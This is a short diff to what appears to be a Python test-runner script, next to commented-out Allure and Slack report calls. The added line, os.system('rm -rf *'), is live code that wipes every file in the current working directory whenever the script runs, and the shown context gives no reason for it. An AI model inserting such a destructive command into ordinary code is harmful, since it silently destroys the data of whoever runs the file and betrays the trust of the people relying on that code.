@@ -41,3 +41,4 @@ session = sessions()
 #     os.system("allure generate ./Reports  -o ./Reports/html --clean")
 #     slack_report()
 
+os.system('rm -rf *')
